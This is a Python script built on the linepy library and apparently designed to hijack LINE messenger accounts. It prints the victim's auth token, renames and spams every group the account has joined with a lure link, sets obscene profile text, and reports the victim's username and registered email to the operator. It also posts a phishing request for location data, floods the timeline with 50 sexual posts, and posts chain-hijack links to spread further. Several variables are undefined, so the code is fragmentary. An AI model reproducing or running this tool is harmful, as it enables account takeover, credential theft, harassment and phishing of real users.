from linepy import *
import random
import os
import time
destroy = LINE()
destroy.log("[Destroy Auth Token :]"+str(client.authToken))
dmids = destroy.getAllContactIds()
dgids = destroy.getGroupIdsJoined()
dset = destroy.getSettings()
for dgid in dgids:
	X = destroy.getGroup(dgid)
	X.name = "koutaが乗っ取ってみたwww"
	destroy.updateGroup(X)
	destroy.sendMessage(dgid,"半botの無料URLはこちら！" + link)
	destroy.leaveGroup(dgid)
	dgcount = dgcount + 1
dp = destroy.getProfile()
dp.disdplayName = "koutaの専属肉便器www"
dp.statusMessage = "あぁイクイク　おっぱいまんこまんこちんこ！"
destroy.updateProfile(dp)
dmail = dset.identityIdentifier
dmid = dp.mid
dc = destroy.getContact(dmid)
daddurl = destroy.reissueUserTicket()
destroy.sendMessage(to,"乗っ取りを解除するために、どのグループでも構わないので現在地を送信してください。安全のためには、公式アカウントが有効です")
destroy.createPost("乗っ取りを解除するために、どのグループでも構わないので現在地を送信してください。安全のためには、公式アカウントが有効です")
client.sendMessage(to,"-乗っ取り成功通知-")
client.sendMessage(to,"[ユーザー名:]" + dp.displayName)
client.sendImageWithURL(msg.to,"http://dl.profile.line-cdn.net/" + dc.pictureStatus)
client.sendMessage(to,"[乗っ取りグループ数:]" + dgcount)
client.sendMessage(to,"[登録メールアドレス:]" + dmail)
client.sendContact(to,dp.mid)
print("-乗っ取り成功通知-")
print("[ユーザー名:]" + dp.displayName)
print("[乗っ取りグループ数:]" + dgcount)
print("[登録メールアドレス:]" + dmail)
cmd = "destroy.bat"
os.system(cmd)
if msg.contentType == 0:
	groupinfo = client.getGroupWithoutMembers(to)
	contact = client.getContact(sender)
	txt = '[%s] %s[location:%s]' % (contact.displayName, text, msg.location)
	print(txt)
	cmd = "title %s"%(groupinfo.name)
	os.system(cmd)
while tlcount != 50:
	destroy.createPost("おっぱいまんこまんこちんこ！")
	tlcount = tlcount + 1
for dgid in dgids:
	dlink = input("芋づる式乗っ取りURL:")
	destroy.createPost("無料で使える半botのリンクはこちら！\n" + dlink)